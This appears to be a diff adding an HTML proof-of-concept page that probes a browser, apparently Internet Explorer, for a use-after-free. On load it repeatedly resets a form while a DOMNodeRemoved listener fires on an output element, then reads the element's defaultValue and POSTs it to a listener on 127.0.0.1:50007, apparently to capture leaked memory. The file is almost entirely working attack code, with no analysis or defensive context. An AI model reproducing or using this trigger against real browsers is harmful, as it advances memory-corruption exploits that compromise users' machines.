@@ -1,0 +1,30 @@
+<!-- saved from url=(0014)about:internet -->
+<html>
+<head>
+<script>
+function SendData(dt){
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', "http://127.0.0.1:50007", true);	
+	xhr.send(dt);
+}
+function probForUaf() {
+	for (var t = 0; t <= 0x10; t++){
+		var d = JunkJunk.defaultValue;
+		JunkJunk.addEventListener("DOMNodeRemoved",doReset,false);
+		doReset();
+	}
+}
+function doReset() {
+	Reset.reset();
+	SendData(JunkJunk.defaultValue);
+	
+}
+</script>
+</head>
+<body onload=probForUaf()>
+<col id="Junk">
+<form id="Reset">
+<output id="JunkJunk">
+<time id="whatsTheTime?">
+</body>
+</html>
